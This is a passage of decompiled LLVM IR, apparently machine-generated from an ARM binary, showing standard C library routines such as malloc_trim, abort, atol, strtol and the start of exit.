  uselistorder i32 %v1_1c74c, { 1, 0, 2 }
  uselistorder i32 %v2_1c748, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1c740, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1c6f0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1c8fc, { 1, 0 }
  uselistorder label %dec_label_pc_1c8e4, { 4, 2, 0, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_1c874, { 1, 0 }
  uselistorder label %dec_label_pc_1c834, { 1, 0 }
  uselistorder label %dec_label_pc_1c828, { 1, 0 }
  uselistorder label %dec_label_pc_1c824, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1c7d8, { 1, 0 }
}

define i32 @function_1c90c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c90c:
  %v0_1c90c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c90c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1c90c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1c90c, %bb
  %v4_1c920 = phi i32 [ %arg1, %dec_label_pc_1c90c ], [ 0, %bb ]
  ret i32 %v4_1c920

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_1c924 = load i32, i32* @r4, align 4
  store i32 %v3_1c924, i32* %stack_var_-12, align 4
  %v6_1c924 = load i32, i32* @r5, align 4
  %v4_1c934 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1c934, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_1c934, i32* @r0, align 4
  %v0_1c944 = call i32 @__malloc_consolidate()
  %v0_1c948 = load i32, i32* @r4, align 4
  %v0_1c94c = load i32, i32* @r5, align 4
  %v2_1c954 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1c954, i32* @r4, align 4
  store i32 %v6_1c924, i32* @r5, align 4
  %v2_1c958 = call i32 @__malloc_trim(i32 %v0_1c948, i32 %v0_1c94c)
  ret i32 %v2_1c958

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r5, align 4
  %v4_1c97c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 16) to i32*), align 4
  store i32 117128, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1c97c)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_1c9a4 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_1c9ac = load i32, i32* @r5, align 4
  %v2_1c9ac = add i32 %v0_1c9ac, 672
  %v3_1c9ac = inttoptr i32 %v2_1c9ac to i32*
  %v4_1c9ac = load i32, i32* %v3_1c9ac, align 4
  %v2_1c9b0 = icmp eq i32 %v4_1c9ac, 0
  br i1 %v2_1c9b0, label %dec_label_pc_1c9b8, label %dec_label_pc_1c9f8

dec_label_pc_1c9b8:                               ; preds = %entry
  store i32 1, i32* %v3_1c9ac, align 4
  br label %dec_label_pc_1c9c0

dec_label_pc_1c9c0:                               ; preds = %dec_label_pc_1ca08, %dec_label_pc_1c9b8
  %v0_1c9c4 = load i32, i32* @r5, align 4
  %v2_1c9c4 = add i32 %v0_1c9c4, 220
  store i32 %v2_1c9c4, i32* @r4, align 4
  %v2_1c9d0 = add i32 %v0_1c9c4, 68
  %v3_1c9d0 = inttoptr i32 %v2_1c9d0 to i32*
  %v4_1c9d0 = load i32, i32* %v3_1c9d0, align 4
  call void @__pseudo_branch(i32 %v4_1c9d0)
  %v1_1c9e0 = call i32 @__GI_raise(i32 6)
  %v0_1c9ec = load i32, i32* @r5, align 4
  %v2_1c9ec = add i32 %v0_1c9ec, 16
  %v3_1c9ec = inttoptr i32 %v2_1c9ec to i32*
  %v4_1c9ec = load i32, i32* %v3_1c9ec, align 4
  store i32 117240, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1c9ec)
  %v0_1c9fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c9f8

dec_label_pc_1c9f8:                               ; preds = %entry, %dec_label_pc_1c9c0
  %v1_1ca10 = phi i32 [ %v0_1c9ac, %entry ], [ %v0_1c9fc.pre, %dec_label_pc_1c9c0 ]
  %v2_1c9fc = add i32 %v1_1ca10, 672
  %v3_1c9fc = inttoptr i32 %v2_1c9fc to i32*
  %v4_1c9fc = load i32, i32* %v3_1c9fc, align 4
  %v7_1ca00 = icmp eq i32 %v4_1c9fc, 1
  br i1 %v7_1ca00, label %dec_label_pc_1ca08, label %dec_label_pc_1ca44

dec_label_pc_1ca08:                               ; preds = %dec_label_pc_1c9f8
  %v2_1ca08 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1ca08, i32* @r4, align 4
  store i32 2, i32* %v3_1c9fc, align 4
  %v3_1ca20 = bitcast i32* %stack_var_-28 to i8*
  %v4_1ca20 = call i32 @__GI_memset(i8* %v3_1ca20, i32 0, i32 20)
  %v3_1ca3c = call i32 @__libc_sigaction(i32 6, i32 %v2_1ca08, i32 0)
  br label %dec_label_pc_1c9c0

dec_label_pc_1ca44:                               ; preds = %dec_label_pc_1c9f8
  %v7_1ca44 = icmp eq i32 %v4_1c9fc, 2
  br i1 %v7_1ca44, label %dec_label_pc_1ca4c, label %dec_label_pc_1ca58

dec_label_pc_1ca4c:                               ; preds = %dec_label_pc_1ca44
  store i32 3, i32* %v3_1c9fc, align 4
  %v0_1ca54 = call i32 @abort()
  %v0_1ca58.pre = load i32, i32* @r5, align 4
  %v1_1ca58.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1ca58

dec_label_pc_1ca58:                               ; preds = %dec_label_pc_1ca44, %dec_label_pc_1ca4c
  %v3_1ca64 = phi i32 [ 672, %dec_label_pc_1ca44 ], [ %v1_1ca58.pre, %dec_label_pc_1ca4c ]
  %v2_1ca64 = phi i32 [ %v1_1ca10, %dec_label_pc_1ca44 ], [ %v0_1ca58.pre, %dec_label_pc_1ca4c ]
  %v2_1ca58 = add i32 %v2_1ca64, %v3_1ca64
  %v3_1ca58 = inttoptr i32 %v2_1ca58 to i32*
  %v4_1ca58 = load i32, i32* %v3_1ca58, align 4
  %v7_1ca5c = icmp eq i32 %v4_1ca58, 3
  br i1 %v7_1ca5c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1ca58
  store i32 4, i32* %v3_1ca58, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1ca58, %bb
  call void @__pseudo_cond_branch(i1 %v7_1ca5c, i32 ptrtoint (i32* @global_var_1e830.538 to i32))
  br label %dec_label_pc_1ca70

dec_label_pc_1ca70:                               ; preds = %dec_label_pc_1ca70, %.thread2
  %v0_1ca70 = call i32 @abort()
  br label %dec_label_pc_1ca70

; uselistorder directives
  uselistorder i32* %v3_1c9fc, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_1ca58, { 1, 0 }
  uselistorder label %dec_label_pc_1c9f8, { 1, 0 }
}

define i32 @function_1ca7c(i64* %arg1) local_unnamed_addr {
dec_label_pc_1ca7c:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_1ca7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ca7c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1ca7c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1ca7c, %bb
  %v4_1ca88 = phi i32 [ %tmp, %dec_label_pc_1ca7c ], [ 0, %bb ]
  ret i32 %v4_1ca88

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_1ca9c = call i32 @strtol()
  ret i32 %v0_1ca9c
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_1cab8 = call i32 @_stdlib_strto_l()
  ret i32 %v0_1cab8
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %ip.global-to-local, align 4
  %v0_1cadc = load i32, i32* @r1, align 4
  store i32 %v0_1cadc, i32* %sb.global-to-local, align 4
  %v0_1cae0 = load i32, i32* @r2, align 4
  store i32 %v0_1cae0, i32* %r5.global-to-local, align 4
  %v0_1cae4 = load i32, i32* @r0, align 4
  store i32 %v0_1cae4, i32* %r4.global-to-local, align 4
  %v0_1cae8 = load i32, i32* @r3, align 4
  br label %dec_label_pc_1caf4

dec_label_pc_1caf0:                               ; preds = %dec_label_pc_1caf4
  %v1_1caf0 = add i32 %v0_1cb2c, 1
  store i32 %v1_1caf0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1caf4

dec_label_pc_1caf4:                               ; preds = %entry, %dec_label_pc_1caf0
  %v0_1cb2c = phi i32 [ %v0_1cae4, %entry ], [ %v1_1caf0, %dec_label_pc_1caf0 ]
  %v1_1caf4 = inttoptr i32 %v0_1cb2c to i8*
  %v2_1caf4 = load i8, i8* %v1_1caf4, align 1
  %v3_1caf4 = zext i8 %v2_1caf4 to i32
  store i32 %v3_1caf4, i32* %r1.global-to-local, align 4
  %v4_1caf8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 284) to i32*), align 4
  %v2_1cafc = mul nuw nsw i32 %v3_1caf4, 2
  %v2_1cb00 = add i32 %v2_1cafc, %v4_1caf8
  %v3_1cb00 = inttoptr i32 %v2_1cb00 to i16*
  %v4_1cb00 = load i16, i16* %v3_1cb00, align 2
  %v1_1cb04 = and i16 %v4_1cb00, 32
  %v2_1cb04 = icmp eq i16 %v1_1cb04, 0
  br i1 %v2_1cb04, label %dec_label_pc_1cb0c, label %dec_label_pc_1caf0

dec_label_pc_1cb0c:                               ; preds = %dec_label_pc_1caf4
  %v7_1cb0c = icmp eq i8 %v2_1caf4, 43
  br i1 %v7_1cb0c, label %dec_label_pc_1cb2c, label %dec_label_pc_1cb14

dec_label_pc_1cb14:                               ; preds = %dec_label_pc_1cb0c
  %v7_1cb14 = icmp eq i8 %v2_1caf4, 45
  br i1 %v7_1cb14, label %dec_label_pc_1cb2c, label %bb

bb:                                               ; preds = %dec_label_pc_1cb14
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cb30

dec_label_pc_1cb2c:                               ; preds = %dec_label_pc_1cb0c, %dec_label_pc_1cb14
  %storemerge47 = phi i32 [ 1, %dec_label_pc_1cb14 ], [ 0, %dec_label_pc_1cb0c ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_1cb2c = add i32 %v0_1cb2c, 1
  store i32 %v1_1cb2c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cb30

dec_label_pc_1cb30:                               ; preds = %bb, %dec_label_pc_1cb2c
  %v0_1cb50 = phi i32 [ %v0_1cb2c, %bb ], [ %v1_1cb2c, %dec_label_pc_1cb2c ]
  %v1_1cb30 = and i32 %v0_1cae0, -17
  %v3_1cb30 = icmp eq i32 %v1_1cb30, 0
  br i1 %v3_1cb30, label %dec_label_pc_1cb3c, label %bb60

bb60:                                             ; preds = %dec_label_pc_1cb30
  br label %bb64

dec_label_pc_1cb3c:                               ; preds = %dec_label_pc_1cb30
  %v1_1cb3c = inttoptr i32 %v0_1cb50 to i8*
  %v2_1cb3c = load i8, i8* %v1_1cb3c, align 1
  %v7_1cb40 = icmp eq i8 %v2_1cb3c, 48
  %v1_1cb44 = add i32 %v0_1cae0, 10
  store i32 %v1_1cb44, i32* %r5.global-to-local, align 4
  br i1 %v7_1cb40, label %dec_label_pc_1cb50, label %bb61

bb61:                                             ; preds = %dec_label_pc_1cb3c
  br label %.thread8

dec_label_pc_1cb50:                               ; preds = %dec_label_pc_1cb3c
  %v1_1cb50 = add i32 %v0_1cb50, 1
  %v2_1cb50 = inttoptr i32 %v1_1cb50 to i8*
  %v3_1cb50 = load i8, i8* %v2_1cb50, align 1
  %v4_1cb50 = zext i8 %v3_1cb50 to i32
  store i32 %v1_1cb50, i32* %r4.global-to-local, align 4
  %v1_1cb54 = or i32 %v4_1cb50, 32
  %v7_1cb58 = icmp eq i32 %v1_1cb54, 120
  %v1_1cb5c = add i32 %v0_1cae0, 8
  store i32 %v1_1cb5c, i32* %r5.global-to-local, align 4
  br i1 %v7_1cb58, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_1cb50
  %v3_1cb68 = mul i32 %v1_1cb5c, 2
  store i32 %v3_1cb68, i32* %r5.global-to-local, align 4
  %v2_1cb6c = add i32 %v0_1cb50, 2
  store i32 %v2_1cb6c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1cb50, %bb61, %bb62
  %v1_1cc4030 = phi i32 [ %v0_1cae4, %bb61 ], [ %v1_1cb50, %bb62 ], [ %v1_1cb50, %dec_label_pc_1cb50 ]
  %v0_1cbbc21 = phi i32 [ %v0_1cb50, %bb61 ], [ %v2_1cb6c, %bb62 ], [ %v1_1cb50, %dec_label_pc_1cb50 ]
  %v0_1cb70 = phi i32 [ %v1_1cb44, %bb61 ], [ %v3_1cb68, %bb62 ], [ %v1_1cb5c, %dec_label_pc_1cb50 ]
  %v5_1cb74 = icmp slt i32 %v0_1cb70, 16
  br i1 %v5_1cb74, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_1cc4029 = phi i32 [ %v0_1cae4, %bb60 ], [ %v1_1cc4030, %.thread8 ], [ %v1_1cc4030, %bb63 ]
  %v0_1cbbc20 = phi i32 [ %v0_1cb50, %bb60 ], [ %v0_1cbbc21, %.thread8 ], [ %v0_1cbbc21, %bb63 ]
  %v0_1cb9c = phi i32 [ %v0_1cae0, %bb60 ], [ %v0_1cb70, %.thread8 ], [ 16, %bb63 ]
  %v1_1cb78 = add i32 %v0_1cb9c, -2
  %tmp = icmp ugt i32 %v1_1cb78, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_1cb88

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1cc3c

dec_label_pc_1cb88:                               ; preds = %bb64
  %v2_1cb90 = udiv i32 -1, %v0_1cb9c
  %v3_1cb90 = urem i32 -1, %v0_1cb9c
  store i32 %v0_1cb9c, i32* %r1.global-to-local, align 4
  %v1_1cba0 = urem i32 %v3_1cb90, 256
  store i32 %v1_1cba0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_1cb90, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1cbbc

dec_label_pc_1cbb8:                               ; preds = %bb71, %dec_label_pc_1cc18
  %v0_1cbb8 = phi i32 [ %v1_1cbf844, %bb71 ], [ %v0_1cbb8.pre, %dec_label_pc_1cc18 ]
  br label %dec_label_pc_1cbbc

dec_label_pc_1cbbc:                               ; preds = %dec_label_pc_1cb88, %dec_label_pc_1cbb8
  %v1_1cc4027 = phi i32 [ %v1_1cc4029, %dec_label_pc_1cb88 ], [ %v0_1cbb8, %dec_label_pc_1cbb8 ]
  %v0_1cbf8 = phi i32 [ %v0_1cbbc20, %dec_label_pc_1cb88 ], [ %v0_1cbb8, %dec_label_pc_1cbb8 ]
  %v1_1cbbc = inttoptr i32 %v0_1cbf8 to i8*
  %v2_1cbbc = load i8, i8* %v1_1cbbc, align 1
  %v3_1cbbc = zext i8 %v2_1cbbc to i32
  %v1_1cbc0 = add nsw i32 %v3_1cbbc, -48
  %v1_1cbc4 = urem i32 %v1_1cbc0, 256
  store i32 %v1_1cbc4, i32* %r1.global-to-local, align 4
  %v1_1cbcc = or i32 %v3_1cbbc, 32
  %tmp79 = icmp ult i32 %v1_1cbc4, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_1cbd4

dec_label_pc_1cbd4:                               ; preds = %dec_label_pc_1cbbc
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_1cbcc, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_1cbd4
  %v1_1cbd8 = add nsw i32 %v1_1cbcc, -87
  %v5_1cbe0 = urem i32 %v1_1cbd8, 256
  store i32 %v5_1cbe0, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_1cbbc, %dec_label_pc_1cbd4, %bb65
  %v3_1cc10 = phi i32 [ %v1_1cbc4, %dec_label_pc_1cbbc ], [ 40, %dec_label_pc_1cbd4 ], [ %v5_1cbe0, %bb65 ]
  %v1_1cbe4 = load i32, i32* %r5.global-to-local, align 4
  %v6_1cbe8 = icmp slt i32 %v3_1cc10, %v1_1cbe4
  br i1 %v6_1cbe8, label %dec_label_pc_1cbec, label %dec_label_pc_1cc3c.loopexit

dec_label_pc_1cbec:                               ; preds = %bb66
  %v0_1cbec = load i32, i32* %ip.global-to-local, align 4
  %v1_1cbec = load i32, i32* %r8.global-to-local, align 4
  %v9_1cbec = icmp eq i32 %v0_1cbec, %v1_1cbec
  br i1 %v9_1cbec, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_1cbec
  %v1_1cbf840 = add i32 %v0_1cbf8, 1
  store i32 %v1_1cbf840, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cc00

bb67:                                             ; preds = %dec_label_pc_1cbec
  %v3_1cbec = icmp ult i32 %v0_1cbec, %v1_1cbec
  %v1_1cbf8 = add i32 %v0_1cbf8, 1
  store i32 %v1_1cbf8, i32* %r4.global-to-local, align 4
  br i1 %v3_1cbec, label %dec_label_pc_1cc00, label %dec_label_pc_1cc18

dec_label_pc_1cc00:                               ; preds = %bb67, %.thread39
  %v1_1cbf844 = phi i32 [ %v1_1cbf840, %.thread39 ], [ %v1_1cbf8, %bb67 ]
  %v4_1cc082443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_1cc00 = load i32, i32* %sl.global-to-local, align 4
  %v3_1cc00 = icmp uge i32 %v3_1cc10, %v1_1cc00
  %v9_1cc00 = icmp eq i32 %v3_1cc10, %v1_1cc00
  %v2_1cc04 = xor i1 %v3_1cc00, true
  %v3_1cc04 = or i1 %v9_1cc00, %v2_1cc04
  br i1 %v3_1cc04, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_1cc00
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_1cc00, %bb68
  %v4_1cc08 = phi i32 [ %v4_1cc082443, %dec_label_pc_1cc00 ], [ 0, %bb68 ]
  %v2_1cc08 = xor i1 %v9_1cc00, true
  %v3_1cc08 = and i1 %v3_1cc00, %v2_1cc08
  br i1 %v3_1cc08, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_1cc08 = urem i32 %v4_1cc08, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_1cc0c = phi i32 [ %v5_1cc08, %bb70 ], [ %v4_1cc08, %bb69 ]
  %v2_1cc0c = icmp eq i32 %v0_1cc0c, 0
  br i1 %v2_1cc0c, label %bb71, label %dec_label_pc_1cc18

bb71:                                             ; preds = %thread-pre-split
  %v4_1cc10 = mul i32 %v0_1cbec, %v1_1cbe4
  %v5_1cc10 = add i32 %v4_1cc10, %v3_1cc10
  store i32 %v5_1cc10, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1cbb8

dec_label_pc_1cc18:                               ; preds = %bb67, %thread-pre-split
  %v0_1cc20 = call i32 @__aeabi_read_tp()
  %v0_1cc24 = load i32, i32* %r7.global-to-local, align 4
  %v2_1cc24 = and i32 %v0_1cae8, %v0_1cc24
  store i32 %v2_1cc24, i32* %r7.global-to-local, align 4
  %v0_1cc28 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1cc28, i32* %ip.global-to-local, align 4
  %v3_1cc2c = load i16, i16* @global_var_2c068.414, align 2
  %v4_1cc2c = sext i16 %v3_1cc2c to i32
  %v3_1cc34 = add i32 %v4_1cc2c, %v0_1cc20
  %v4_1cc34 = inttoptr i32 %v3_1cc34 to i32*
  store i32 34, i32* %v4_1cc34, align 4
  %v0_1cbb8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cbb8

dec_label_pc_1cc3c.loopexit:                      ; preds = %bb66
  %v0_1cc3c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1cc3c

dec_label_pc_1cc3c:                               ; preds = %.thread, %dec_label_pc_1cc3c.loopexit
  %v1_1cc40 = phi i32 [ %v1_1cc4027, %dec_label_pc_1cc3c.loopexit ], [ %v1_1cc4029, %.thread ]
  %v2_1cc40 = phi i32 [ %v0_1cc3c.pre, %dec_label_pc_1cc3c.loopexit ], [ %v0_1cadc, %.thread ]
  %v2_1cc3c = icmp eq i32 %v2_1cc40, 0
  br i1 %v2_1cc3c, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_1cc3c
  %v3_1cc40 = inttoptr i32 %v2_1cc40 to i32*
  store i32 %v1_1cc40, i32* %v3_1cc40, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_1cc3c, %bb72
  %v0_1cc48 = load i32, i32* %r7.global-to-local, align 4
  %v2_1cc48 = icmp eq i32 %v0_1cc48, 0
  %. = select i1 %v2_1cc48, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_1cc54 = icmp eq i32 %v0_1cae8, 0
  %v0_1cc80.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_1cc54, label %dec_label_pc_1cc78, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_1cc80.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_1cc60, label %dec_label_pc_1cc78

dec_label_pc_1cc60:                               ; preds = %bb76
  %v0_1cc64 = call i32 @__aeabi_read_tp()
  %v3_1cc68 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1cc68 = sext i16 %v3_1cc68 to i32
  %v3_1cc70 = add i32 %v4_1cc68, %v0_1cc64
  %v4_1cc70 = inttoptr i32 %v3_1cc70 to i32*
  store i32 34, i32* %v4_1cc70, align 4
  %v0_1cc74 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1cc74, i32* %ip.global-to-local, align 4
  %v0_1cc78.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cc78

dec_label_pc_1cc78:                               ; preds = %bb76, %bb73, %dec_label_pc_1cc60
  %v0_1cc80.pre = phi i32 [ %v0_1cc80.pre.pre, %bb76 ], [ %v0_1cc74, %dec_label_pc_1cc60 ], [ %v0_1cc80.pre.pre, %bb73 ]
  %v0_1cc78 = phi i32 [ %v0_1cc48, %bb76 ], [ %v0_1cc78.pre, %dec_label_pc_1cc60 ], [ %v0_1cc48, %bb73 ]
  %v2_1cc78 = icmp eq i32 %v0_1cc78, 0
  br i1 %v2_1cc78, label %dec_label_pc_1cc78._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_1cc78
  %v2_1cc7c = sub i32 0, %v0_1cc80.pre
  store i32 %v2_1cc7c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1cc78._crit_edge

dec_label_pc_1cc78._crit_edge:                    ; preds = %dec_label_pc_1cc78, %bb77
  %v0_1cc80 = phi i32 [ %v2_1cc7c, %bb77 ], [ %v0_1cc80.pre, %dec_label_pc_1cc78 ]
  ret i32 %v0_1cc80

; uselistorder directives
  uselistorder i32 %v0_1cc80.pre, { 1, 0 }
  uselistorder i32 %v0_1cc80.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_1cc08, { 1, 0 }
  uselistorder i1 %v3_1cc00, { 1, 0 }
  uselistorder i32 %v1_1cc00, { 1, 0 }
  uselistorder i32 %v5_1cbe0, { 1, 0 }
  uselistorder i32 %v1_1cbcc, { 1, 0 }
  uselistorder i32 %v1_1cbc4, { 2, 0, 1 }
  uselistorder i32 %v0_1cbf8, { 1, 0, 2 }
  uselistorder i32 %v0_1cbb8, { 1, 0 }
  uselistorder i32 %v3_1cb68, { 1, 0 }
  uselistorder i32 %v1_1cb5c, { 1, 0, 2 }
  uselistorder i32 %v0_1cb50, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1cb2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1cae8, { 1, 0 }
  uselistorder i32 %v0_1cae4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1cae0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 5, 6, 0, 8, 11, 7, 12, 1, 2, 3, 4, 9, 10 }
  uselistorder i8 48, { 5, 0, 6, 7, 1, 8, 2, 3, 9, 10, 4, 11, 12 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_1cc78._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1cc78, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_1cc3c, { 1, 0 }
  uselistorder label %dec_label_pc_1cc18, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cbbc, { 1, 0 }
  uselistorder label %dec_label_pc_1cbb8, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1cb30, { 1, 0 }
  uselistorder label %dec_label_pc_1cb2c, { 1, 0 }
  uselistorder label %dec_label_pc_1caf4, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r5, align 4
  %v4_1ccac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 140) to i32*), align 4
  store i32 %v4_1ccac, i32* @r4, align 4
  %v2_1ccb4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_1ccb4, i32* %r0.global-to-local, align 4
  %v4_1cccc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1cccc)
  %v0_1ccdc = load i32, i32* @r4, align 4
  store i32 %v0_1ccdc, i32* %r0.global-to-local, align 4
  %v0_1cce0 = load i32, i32* @r5, align 4
  %v2_1cce0 = add i32 %v0_1cce0, 16
  %v3_1cce0 = inttoptr i32 %v2_1cce0 to i32*
  %v4_1cce0 = load i32, i32* %v3_1cce0, align 4
  call void @__pseudo_branch(i32 %v4_1cce0)
  %v0_1ccf0 = load i32, i32* @r5, align 4
